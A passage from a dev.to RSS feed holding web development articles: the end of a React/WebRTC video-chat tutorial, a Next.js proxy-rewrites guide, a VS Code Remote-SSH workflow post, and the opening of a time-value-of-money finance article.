                this.createVideo({ id: this.myID, stream });
                this.setPeersListeners(stream);
                this.newUserConnection(stream);
            }
        })
    }
    getVideoAudioStream = (video=true, audio=true) =&amp;gt; {
        let quality = this.settings.params?.quality;
        if (quality) quality = parseInt(quality);
        const myNavigator = navigator.mediaDevices.getUserMedia || 
        navigator.mediaDevices.webkitGetUserMedia || 
        navigator.mediaDevices.mozGetUserMedia || 
        navigator.mediaDevices.msGetUserMedia;
        return myNavigator({
            video: video ? {
                frameRate: quality ? quality : 12,
                noiseSuppression: true,
                width: {min: 640, ideal: 1280, max: 1920},
                height: {min: 480, ideal: 720, max: 1080}
            } : false,
            audio: audio,
        });
    }
    createVideo = (createObj) =&amp;gt; {
        if (!this.videoContainer[createObj.id]) {
            this.videoContainer[createObj.id] = {
                ...createObj,
            };
            const roomContainer = document.getElementById('room-container');
            const videoContainer = document.createElement('div');
            const video = document.createElement('video');
            video.srcObject = this.videoContainer[createObj.id].stream;
            video.id = createObj.id;
            video.autoplay = true;
            if (this.myID === createObj.id) video.muted = true;
            videoContainer.appendChild(video)
            roomContainer.append(videoContainer);
        } else {
            // @ts-ignore
            document.getElementById(createObj.id)?.srcObject = createObj.stream;
        }
    }
    setPeersListeners = (stream) =&amp;gt; {
        this.myPeer.on('call', (call) =&amp;gt; {
            call.answer(stream);
            call.on('stream', (userVideoStream) =&amp;gt; {console.log('user stream data', 
            userVideoStream)
                this.createVideo({ id: call.metadata.id, stream: userVideoStream });
            });
            call.on('close', () =&amp;gt; {
                console.log('closing peers listeners', call.metadata.id);
                this.removeVideo(call.metadata.id);
            });
            call.on('error', () =&amp;gt; {
                console.log('peer error ------');
                this.removeVideo(call.metadata.id);
            });
            peers[call.metadata.id] = call;
        });
    }
    newUserConnection = (stream) =&amp;gt; {
        this.socket.on('new-user-connect', (userData) =&amp;gt; {
            console.log('New User Connected', userData);
            this.connectToNewUser(userData, stream);
        });
    }
    connectToNewUser(userData, stream) {
        const { userID } = userData;
        const call = this.myPeer.call(userID, stream, { metadata: { id: this.myID }});
        call.on('stream', (userVideoStream) =&amp;gt; {
            this.createVideo({ id: userID, stream: userVideoStream, userData });
        });
        call.on('close', () =&amp;gt; {
            console.log('closing new user', userID);
            this.removeVideo(userID);
        });
        call.on('error', () =&amp;gt; {
            console.log('peer error ------')
            this.removeVideo(userID);
        })
        peers[userID] = call;
    }
    removeVideo = (id) =&amp;gt; {
        delete this.videoContainer[id];
        const video = document.getElementById(id);
        if (video) video.remove();
    }
    destoryConnection = () =&amp;gt; {
        const myMediaTracks = this.videoContainer[this.myID]?.stream.getTracks();
        myMediaTracks?.forEach((track:any) =&amp;gt; {
            track.stop();
        })
        socketInstance?.socket.disconnect();
        this.myPeer.destroy();
    }
}

export function createSocketConnectionInstance(settings={}) {
    return socketInstance = new Connection(settings);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;Here we have created a Connection class to maintain all our socket and peer connection, Don't worry we will walk through all the functions above.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;we have a constructor that gets a settings object (optional) that can be used to send some data from our component for setting up our connection class like (sending video frame to be used)&lt;/li&gt;
&lt;li&gt;Inside constructor we are invoking two methods initializeSocketEvents() and initializePeersEvents()

&lt;ul&gt;
&lt;li&gt; initializeSocketEvents() - Will start socket connection with our backend.&lt;/li&gt;
&lt;li&gt; initializePeersEvents() - Will start peer connection with our peer server.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Then we have setNavigatorToStream() which has getVideoAndAudio() function which will get the audio and video stream from the navigator. We can specify the video frame rate in the navigator.&lt;/li&gt;
&lt;li&gt;If the stream is available then we will be resolving in .then(streamObj) and now we can create a video element to display our stream bypassing stream object to createVideo().&lt;/li&gt;
&lt;li&gt;Now after getting our own stream it's time to listen to the peer events in function setPeersListeners() where we will be listening for any incoming video stream from another user and will stream our data in peer.answer(ourStream).&lt;/li&gt;
&lt;li&gt;And the we will be setting newUserConnection(), where we will be sending our stream, if we are connecting to the existing room and also keeping track of the current peer connection by userID in peers Object.&lt;/li&gt;
&lt;li&gt;Finally we have removeVideo to remove the video element from dom when any user dissconnected.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;5) Now the backend needs to listen to the socket connection. Using socket "socket.io" to make the socket connection easy.&lt;/p&gt;

&lt;p&gt;Backend - &lt;strong&gt;./server.js&lt;/strong&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;import socketIO from 'socket.io';
io.on('connection', socket =&amp;gt; {
    console.log('socket established')
    socket.on('join-room', (userData) =&amp;gt; {
        const { roomID, userID } = userData;
        socket.join(roomID);
        socket.to(roomID).broadcast.emit('new-user-connect', userData);
        socket.on('disconnect', () =&amp;gt; {
            socket.to(roomID).broadcast.emit('user-disconnected', userID);
        });
    });
});
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;Now we have added socket connection to backend to listen to join room, which will be triggred from frontend with userData containing roomID and userID. The userID is available when creating the peer connection.&lt;/p&gt;

&lt;p&gt;Then the socket has now connected a room with the roomID (From unique id got as response in frontend) and now we can dispatch message to all the users in the room. &lt;/p&gt;

&lt;p&gt;Now socket.to(roomID).broadcast.emit('new-user-connect', userData);  with this we can dispatch message to all the user's connected except us. And this 'new-user-connect is listened at the frontend so all the user's connected in the room will receive the new user data.&lt;/p&gt;

&lt;p&gt;6) Now you need create a peerjs server by using following commands&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;npm i -g peerjs
peerjs --port 9000
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;7) Now in Room Component we need to invoke the Connection class to start the call. In Room Component add this functionality.&lt;/p&gt;

&lt;p&gt;Frontend - &lt;strong&gt;./RoomComponent.js&lt;/strong&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;    let socketInstance = useRef(null);    
    useEffect(() =&amp;gt; {
        startConnection();
    }, []);
    const startConnection = () =&amp;gt; {
        params = {quality: 12}
        socketInstance.current = createSocketConnectionInstance({
            params
        });
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;Now you will be able to see that after creating a room, when a new user joins the user will be peer-to-peer connected.&lt;/p&gt;

&lt;p&gt;8) Now for Screen Sharing You need to replace the current stream with the new screen sharing stream.&lt;/p&gt;

&lt;p&gt;Frontend - &lt;strong&gt;./connection.js&lt;/strong&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;    reInitializeStream = (video, audio, type='userMedia') =&amp;gt; {
        const media = type === 'userMedia' ? this.getVideoAudioStream(video, audio) : 
        navigator.mediaDevices.getDisplayMedia();
        return new Promise((resolve) =&amp;gt; {
            media.then((stream) =&amp;gt; {
                if (type === 'displayMedia') {
                    this.toggleVideoTrack({audio, video});
                }
                this.createVideo({ id: this.myID, stream });
                replaceStream(stream);
                resolve(true);
            });
        });
    }
    toggleVideoTrack = (status) =&amp;gt; {
        const myVideo = this.getMyVideo();
        if (myVideo &amp;amp;&amp;amp; !status.video) 
            myVideo.srcObject?.getVideoTracks().forEach((track) =&amp;gt; {
                if (track.kind === 'video') {
                    !status.video &amp;amp;&amp;amp; track.stop();
                }
            });
        else if (myVideo) {
            this.reInitializeStream(status.video, status.audio);
        }
    }
    replaceStream = (mediaStream) =&amp;gt; {
        Object.values(peers).map((peer) =&amp;gt; {
            peer.peerConnection?.getSenders().map((sender) =&amp;gt; {
                if(sender.track.kind == "audio") {
                    if(mediaStream.getAudioTracks().length &amp;gt; 0){
                        sender.replaceTrack(mediaStream.getAudioTracks()[0]);
                    }
                }
                if(sender.track.kind == "video") {
                    if(mediaStream.getVideoTracks().length &amp;gt; 0){
                        sender.replaceTrack(mediaStream.getVideoTracks()[0]);
                    }
                }
            });
        })
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;Now the current stream needs to reInitializeStream() will be checking the type it needs to replace, if it is userMedia then it will be streaming from cam and mic, if its display media it gets the display stream object from getDisplayMedia() and then it will toggle the track to stop or start the cam or mic.&lt;/p&gt;

&lt;p&gt;Then the new stream video element is created based on the userID and then it will place the new stream by replaceStream(). By getting the current call object store previosly will contain the curretn stream data will be replaced with the new stream data in replaceStream().&lt;/p&gt;

&lt;p&gt;9) At roomConnection we need to create a button to toggle the video and screen sharing.&lt;/p&gt;

&lt;p&gt;Frontend - &lt;strong&gt;./RoomConnection.js&lt;/strong&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;    const [mediaType, setMediaType] = useState(false);    
    const toggleScreenShare = (displayStream ) =&amp;gt; {
        const { reInitializeStream, toggleVideoTrack } = socketInstance.current;
        displayStream === 'displayMedia' &amp;amp;&amp;amp; toggleVideoTrack({
            video: false, audio: true
        });
        reInitializeStream(false, true, displayStream).then(() =&amp;gt; {
            setMediaType(!mediaType)
        });
    }
    return (
        &amp;lt;React.Fragment&amp;gt;
            &amp;lt;div id="room-container"&amp;gt;&amp;lt;/div&amp;gt;
            &amp;lt;button onClick={handleDisconnect}&amp;gt;Disconnect&amp;lt;/button&amp;gt;
            &amp;lt;button 
                onClick={() =&amp;gt; reInitializeStream(mediaType ? 
                'userMedia' : 'displayMedia')}
            &amp;gt;
            {mediaType ? 'screen sharing' : 'stop sharing'}&amp;lt;/button&amp;gt;
        &amp;lt;/React.Fragment&amp;gt;
    )
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;Thats all you have Create a application with video chatting and screen sharing.&lt;/p&gt;

&lt;p&gt;Good Luck !!!&lt;br&gt;
Here's my working demo - &lt;a href="https://vichat.netlify.app/"&gt;vichah&lt;/a&gt;&lt;br&gt;
Check out my blog - &lt;a href="https://dev-ajs.blogspot.com/"&gt;https://dev-ajs.blogspot.com/&lt;/a&gt;&lt;/p&gt;

</description>
      <category>react</category>
      <category>webrtc</category>
      <category>javascript</category>
      <category>node</category>
    </item>
    <item>
      <title>Setting up proxy in Next.js for DEV environment</title>
      <author>Georgekutty Antony</author>
      <pubDate>Sat, 02 Jan 2021 11:22:44 +0000</pubDate>
      <link>https://dev.to/george3447/setting-up-proxy-in-nextjs-for-dev-enviornment-1nh3</link>
      <guid>https://dev.to/george3447/setting-up-proxy-in-nextjs-for-dev-enviornment-1nh3</guid>
      <description>&lt;h2&gt;
  &lt;a href="#introduction" class="anchor"&gt;
  &lt;/a&gt;
  Introduction
&lt;/h2&gt;

&lt;p&gt;In general, we expect to have a default proxy setup in Next.js just like react. But unfortunately, there is no such feature in package.json and we need to add custom proxy server and hacks to work with the external API in the development environment. Fortunately, in version 9.5, Next.js released a new simple way to interact with APIs that hosted outside the app. &lt;/p&gt;

&lt;p&gt;Lets start by modifying our next.config.js file.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#step-1" class="anchor"&gt;
  &lt;/a&gt;
  Step 1
&lt;/h3&gt;

&lt;p&gt;We can use the new rule "rewrites". Refer to the &lt;a href="https://nextjs.org/docs/api-reference/next.config.js/rewrites"&gt;documentation&lt;/a&gt; for the same. In order to proxy our API requests, we need to add this rewrites rule with source and destination. Please have a look at the below code.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt; &lt;span class="k"&gt;async&lt;/span&gt; &lt;span class="nx"&gt;rewrites&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="p"&gt;[&lt;/span&gt;
          &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="na"&gt;source&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;/api/:slug*&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="na"&gt;destination&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;`http://localhost:3333/api/:slug*`&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
          &lt;span class="p"&gt;},&lt;/span&gt;
        &lt;span class="p"&gt;]&lt;/span&gt;
 &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;Here, the source will filter every calls that start with &lt;code&gt;'/api'&lt;/code&gt; and the destination will be used to rewrite the request with &lt;code&gt;'http://localhost:3333/api'&lt;/code&gt;. The &lt;code&gt;:slug*&lt;/code&gt; will take the remaining part and append the same to destination url.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#step-2" class="anchor"&gt;
  &lt;/a&gt;
  Step 2
&lt;/h3&gt;

&lt;p&gt;If we need to add another location that hosted separately, for example, every calls that starts with &lt;code&gt;'/images'&lt;/code&gt;, we can simply add the following code to our existing rewrites rule.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="k"&gt;async&lt;/span&gt; &lt;span class="nx"&gt;rewrites&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="p"&gt;[&lt;/span&gt;
          &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="na"&gt;source&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;/api/:slug*&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="na"&gt;destination&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;`http://localhost:3333/api/:slug*`&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
          &lt;span class="p"&gt;},&lt;/span&gt;
          &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="na"&gt;source&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;/images/:slug*&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="na"&gt;destination&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;`http://localhost:3334/images/:slug*`&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
          &lt;span class="p"&gt;}&lt;/span&gt;
      &lt;span class="p"&gt;]&lt;/span&gt;
 &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;Here, the new rule source will filter every calls that start with &lt;code&gt;'/images'&lt;/code&gt; and the destination will be used to rewrite the request with &lt;code&gt;'http://localhost:3334/images'&lt;/code&gt;. As I have mentioned earlier, the &lt;code&gt;:slug*&lt;/code&gt; will take the remaining part and append the same to destination url.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#step-3" class="anchor"&gt;
  &lt;/a&gt;
  Step 3
&lt;/h2&gt;

&lt;p&gt;Furthermore, the rules we have added will work in production as well. If we have dedicated reverse proxy in production, then we don't require this rule. Whereas, we can disable it in production by adding a check for NODE_ENV.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="k"&gt;async&lt;/span&gt; &lt;span class="nx"&gt;rewrites&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nx"&gt;process&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;env&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;NODE_ENV&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;production&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;
      &lt;span class="p"&gt;?&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
          &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="na"&gt;source&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;/api/:slug*&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="na"&gt;destination&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;`http://localhost:3333/api/:slug*`&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
          &lt;span class="p"&gt;},&lt;/span&gt;
          &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="na"&gt;source&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;/images/:slug*&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="na"&gt;destination&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;`http://localhost:3333/images/:slug*`&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
          &lt;span class="p"&gt;},&lt;/span&gt;
        &lt;span class="p"&gt;]&lt;/span&gt;
      &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[];&lt;/span&gt;
 &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;h6&gt;
  &lt;a href="#please-dont-forget-to-run-set-nodeenv-before-running-the-raw-npm-run-build-endraw-command" class="anchor"&gt;
  &lt;/a&gt;
  Please don't forget to run set NODE_ENV before running the &lt;code&gt;npm run build&lt;/code&gt; command.
&lt;/h6&gt;

&lt;h2&gt;
  &lt;a href="#step-4" class="anchor"&gt;
  &lt;/a&gt;
  Step 4
&lt;/h2&gt;

&lt;p&gt;Last step is to ensure that all our existing APIs in the client side has been changed to relative url. If we have API calls that needs to be run in server, then we need to change the external url to Next.js local development url just like in the following code.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;
&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;getStaticProps&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nx"&gt;getServerSideProps&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;async&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;

  &lt;span class="c1"&gt;// Before Setting Proxy&lt;/span&gt;
  &lt;span class="c1"&gt;// const data = await getData('http://localhost:3333/api/data');&lt;/span&gt;

  &lt;span class="c1"&gt;// After Setting Proxy&lt;/span&gt;
  &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;getData&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;http://localhost:3000/api/data&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="na"&gt;props&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="nx"&gt;data&lt;/span&gt;
    &lt;span class="p"&gt;},&lt;/span&gt;
  &lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;Here, Next.js will rewrite the &lt;code&gt;http://localhost:3000/api&lt;/code&gt; to &lt;code&gt;http://localhost:3333/api&lt;/code&gt; using the &lt;code&gt;rewrites&lt;/code&gt; rule we have specified earlier in the &lt;code&gt;next.config.js&lt;/code&gt;.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#conclusion" class="anchor"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h2&gt;

&lt;p&gt;In this article, we saw that how we can set up proxy to external APIs without installing any third party packages or using custom server.js. I recommend you to have look at the Next.js &lt;a href="https://nextjs.org/docs/api-reference/next.config.js/introduction"&gt;documentation&lt;/a&gt;!&lt;/p&gt;

</description>
      <category>nextjs</category>
      <category>react</category>
    </item>
    <item>
      <title>My new coding workflow: VS Code + Remote-SSH extension</title>
      <author>Jan-Lukas Else</author>
      <pubDate>Sat, 02 Jan 2021 10:49:00 +0000</pubDate>
      <link>https://dev.to/jle/my-new-coding-workflow-vs-code-remote-ssh-extension-5fa3</link>
      <guid>https://dev.to/jle/my-new-coding-workflow-vs-code-remote-ssh-extension-5fa3</guid>
      <description>&lt;p&gt;I recently &lt;a href="https://jlelse.blog/thoughts/2019/09/vscode-remote-ssh/"&gt;rediscovered&lt;/a&gt; the ability of Visual Studio Code to develop on remote machines. Just connect to a server via SSH and develop there.&lt;/p&gt;

&lt;p&gt;Even though I'm using Git, I don't have to commit everything immediately to continue development on another machine, I don't have to take care to keep all my development tools up to date on all my machines, and I can continue working from my Surface Go with Windows exactly where I left off with my Ubuntu desktop. And I can, for example, start drafting a blog post on one computer, but finish it on another.&lt;/p&gt;

&lt;p&gt;All I need is a cheap rented virtual private server and Visual Studio Code on every machine I want to code from.&lt;/p&gt;




&lt;p&gt;But first of all the reason why I got the idea in the first place:&lt;/p&gt;

&lt;p&gt;To program in Go, I mainly used &lt;a href="https://www.jetbrains.com/idea/"&gt;IDEA Ultimate&lt;/a&gt; from JetBrains in the past. The best IDE a developer can wish for. Excellent for Java, Kotlin, Go and a lot of other programming languages. And pretty cool: As a student you can get the full IDE for free.&lt;/p&gt;

&lt;p&gt;However, since I won't be a student forever and IDEA Ultimate or as an alternative just &lt;a href="https://www.jetbrains.com/go/"&gt;GoLand&lt;/a&gt; from JetBrains &lt;a href="https://www.jetbrains.com/store/#personal"&gt;aren't very cheap&lt;/a&gt; (at least for hobby projects), I thought I might get used to a different workflow now that will cost me less money later.&lt;/p&gt;

&lt;p&gt;The second best option for developing Go is probably &lt;a href="https://code.visualstudio.com/"&gt;Visual Studio Code&lt;/a&gt;. The Go team took over the development of &lt;a href="https://github.com/golang/vscode-go/"&gt;the Go extension&lt;/a&gt; not too long ago, which will hopefully make it more and more pleasant to develop Go programs with VS Code in the future.&lt;/p&gt;

&lt;p&gt;VS Code is free, partly even &lt;a href="https://github.com/Microsoft/vscode"&gt;open source&lt;/a&gt; and I already use it for quite a lot of things anyway, be it for writing longer blog articles or if I need to write some JavaScript. In itself it is just a text editor, but there are quite a few extensions that add all kinds of functionality. And VS Code is fast and available for all three major computer operating systems.&lt;/p&gt;

&lt;p&gt;For VS Code there is an extension called "Remote - SSH" (documentation is available &lt;a href="https://code.visualstudio.com/docs/remote/ssh"&gt;here&lt;/a&gt;) with which it is possible to connect to another computer or server via SSH. On the remote computer VS Code installs a remote server to provide almost all functionality that is possible locally. It's like running VS Code directly on the remote computer and developing from there.&lt;/p&gt;

&lt;p&gt;As a server I use the cheapest option from &lt;a href="https://www.hetzner.com/cloud"&gt;Hetzner Cloud&lt;/a&gt;. With just a few clicks I created a VPS with Ubuntu 20.04, two Gigabytes of RAM and 20 GB SSD storage. I also use Ubuntu 20.04 on my desktop computer and laptop, the environment I am used to. And if the server should be too weak for certain tasks, I can scale it up with a few clicks, even temporarily. The costs are 2,89 € per month. If I don't need the server for a longer period of time, I could also create an image of the hard drive, delete the server and create a new one later based on the image. That would cost only a few cents per month.&lt;/p&gt;

&lt;p&gt;This way I only have to install all the tools I need on the server. Like Go for the programming of various private projects or Hugo for this blog and my website. But I don't have to install these tools on all my devices anymore, namely my desktop computer, my Ubuntu-ThinkPad and my Surface Go. There I only need Visual Studio Code with the "Remote - SSH" extension.&lt;/p&gt;

&lt;p&gt;It definitely takes some getting used to in order to adapt to the less comfort you might be used to through the JetBrains IDE. But once you have found the right settings of the Go extension (for example that the Go language server &lt;code&gt;gopls&lt;/code&gt; is used), then programming with this setup works quite well.&lt;/p&gt;

&lt;p&gt;My favorite feature is definitely the ability to forward ports from the server to the local machine.&lt;/p&gt;

&lt;p&gt;The only possible negative point is that I need an internet connection to develop so that I can connect to the server. But so often I am not without internet and even in Germany the mobile network should be sufficient for SSH. And when I am offline, I will just have to do something else.&lt;/p&gt;

</description>
      <category>vscode</category>
      <category>ssh</category>
      <category>programming</category>
      <category>development</category>
    </item>
    <item>
      <title>Time Value of Money in Finance and Investment For Software Developers</title>
      <author>Ilona Codes</author>
      <pubDate>Sat, 02 Jan 2021 09:53:40 +0000</pubDate>
      <link>https://dev.to/ilonacodes/time-value-of-money-in-finance-and-investment-for-software-developers-1fh</link>
      <guid>https://dev.to/ilonacodes/time-value-of-money-in-finance-and-investment-for-software-developers-1fh</guid>
      <description>&lt;p&gt;Benjamin Franklin once said: &lt;em&gt;"Remember that time is money."&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The Time Value of Money (TVM) just means that money in your hand right now is worth more than the same amount of money that you will receive in the future.&lt;/p&gt;

&lt;p&gt;The idea is that money available at present is more worth than the same amount in the future. The core principle of finance:&lt;/p&gt;

&lt;p&gt;‣ Invested capital can earn interest&lt;/p&gt;

&lt;p&gt;‣ Any amount of money is worth more the sooner it's received.&lt;/p&gt;

&lt;p&gt;The underlying fundamentals of the time value of money are often used to &lt;a href="https://ilonacodes.com/blog/how-developers-can-supercharge-their-savings/"&gt;value investments like stocks, bonds, credits.&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Let's search for equivalent amounts of money on time:&lt;/p&gt;

&lt;p&gt;Would you prefer to get $1000 today or $1000 one year from now? – I bet that you would say $1000 today.&lt;/p&gt;

&lt;p&gt;What about the choice between $1000 today or $1001 next year? – I am pretty sure that you would still prefer the $1000 today. Not the last reason is inflation because it will bring up that extra $1 or more. So you might be even worse off. It's better to take the $1000 now and not wait a year for just $1.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;"A bird in the hand is worth 2 in the bush."–Proverb&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Let us make other more common examples of cash flow value today vs. in the future.&lt;/p&gt;

&lt;p&gt;If you receive $200 per year for the next six years, &lt;strong&gt;what is the net present value if the current inflation rate is 3%:&lt;/strong&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
